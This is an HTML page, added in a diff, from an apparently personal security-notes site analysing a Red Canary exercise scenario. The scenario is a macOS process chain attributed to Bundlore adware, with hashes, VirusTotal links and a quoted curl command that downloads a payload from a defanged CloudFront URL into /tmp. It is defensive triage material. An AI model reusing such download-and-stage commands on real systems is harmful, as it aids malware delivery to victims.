@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Scenario #4 Analysis · Will Seligman</title>
+<link rel="stylesheet" href="/assets/style.css">
+</head>
+<body>
+<button id="menu-toggle" aria-label="Toggle navigation">&#9776; Menu</button>
+<div class="layout">
+<aside class="sidebar" id="sidebar">
+  <a class="brand" href="/index.html">
+    <span class="brand-flag">&#127988;</span>
+    <span class="brand-text"><strong>Will Seligman</strong><small>Cybersecurity Notes & CTF Writeups</small></span>
+  </a>
+  <nav class="nav" id="nav-root" data-current="other/exercises/red-canary/scenario-4-analysis.html"></nav>
+</aside>
+<main class="content">
+  <article class="doc">
+  <div class="breadcrumb"><a href="/other/index.html">Other</a> &rsaquo; <a href="/other/exercises.html">Exercises</a> &rsaquo; <a href="/other/exercises/red-canary.html">Red Canary</a></div>
+  <h1 id="scenario-4-analysis">Scenario #4 Analysis</h1>
+<pre><code class="language-text">
+Grand-Parent Process: /private/tmp/b6yNLWzjO 
+
+#https://www.virustotal.com/gui/file/96792f6318b530f40868c3bde69f8fad0ff6ce7e646bd702e93d3633e033c4bb labeled OSX, adware.bundlore/bnodlero
+Grand-Parent MD5: ab47aa51b678216bc998fe7e5fe7aefd
+
+#The system shows signs of potentially malicious activity originating from the executable /private/tmp/b6yNLWzjO
+Grand-Parent CLI:
+/tmp/b6yNLWzjO /Volumes/Installer/Installer.app/Contents/MacOS/LightEvening
+
+
+
+#launched a parent shell process 
+Parent Process: /bin/sh
+
+#https://www.virustotal.com/gui/file/6de76ab470a16b2a825d223b996d994623473c694c60fccbb71af8691e61c5e0
+Parent MD5: 95d23ed8b5448779eee9863d2bc5c1ba
+
+#executing a curl command to download a file from a suspicious CloudFront URL
+Parent CLI: 
+sh -c curl -f0L -o /tmp/EB1E53E9-6B2A-4D01-99FF-DB4CB484EA63/45D77C73-D4A2-4698-A0A1-34926AEDF82D ’hxxp://redacted.cloudfront[.]net/sd/?c=22lybQ==&amp;u=67D936BA-DC18-5557-AF59-A61155059BC5&amp;s=EB1E53E9-6B2A-4D01-99FF-DB4CB484EA63&amp;o=10.15.7&amp;b=11821208528&amp;gs=1' &gt; /dev/null 2&gt;&amp;1
+
+
+
+#download the payload to a temporary directory 
+Process: /usr/bin/curl
+
+#https://www.virustotal.com/gui/file/af20aa17b66b6bfcb63afd217cf0c6b931b88e916ec20286cce8b7c4c1e9c854
+Process MD5: 0846e04c22488b04222817529f235024
+
+Process CLI:
+curl -f0L -o /tmp/EB1E53E9-6B2A-4D01-99FF-DB4CB484EA63/45D77C73-D4A2-4698-A0A1-34926AEDF82D hxxp://redacted.cloudfront[.]net/sd/?c=22lybQ==&amp;u=67D936BA-DC18-5557-AF59-A61155059BC5&amp;s=EB1E53E9-6B2A-4D01-99FF-DB4CB484EA63&amp;o=10.15.7&amp;b=11821208528&amp;gs=1
+
+#two active network connections and three file modifications, this behavior suggests an attempt to download and potentially execute malicious software
+Network connection count: 2
+File modifications: 3
+</code></pre>
+<p><strong>Overview</strong><br />
+The process chain exhibits characteristics of malicious behavior, leveraging a temporary binary (<code>/private/tmp/b6yNLWzjO</code>) as the <strong>grand-parent process</strong> to initiate a <strong>parent shell process</strong> (<code>/bin/sh</code>) for executing a <code>curl</code> command. <br />
+The command fetches a file from a suspicious CloudFront-hosted URL (<code>hxxp://redacted.cloudfront[.]net/sd/...</code>) and writes it to a temporary directory (<code>/tmp/EB1E53E9-6B2A-4D01-99FF-DB4CB484EA63</code>). <br />
+The fetched file's path, combined with associated <strong>file modifications</strong> and <strong>network connections</strong>, suggests an attempt to deploy a payload or establish persistence. </p>
+<p><strong>Summary</strong><br />
+This process chain demonstrates a highly suspicious sequence indicative of malware delivery or staging activity. The use of temporary binaries, unauthorized network activity, and file modifications aligns with tactics used for initial access, payload delivery, and execution. Immediate investigation into the source of the temporary binary, the contents of the downloaded file, and system integrity is warranted to mitigate further compromise.</p>
+  </article>
+  <footer class="foot">Notes by Will Seligman · built from Notion</footer>
+</main>
+</div>
+<script src="/assets/nav.js" defer></script>
+<script>
+document.getElementById('menu-toggle').addEventListener('click',function(){
+  document.getElementById('sidebar').classList.toggle('open');
+});
+</script>
+</body>
+</html>
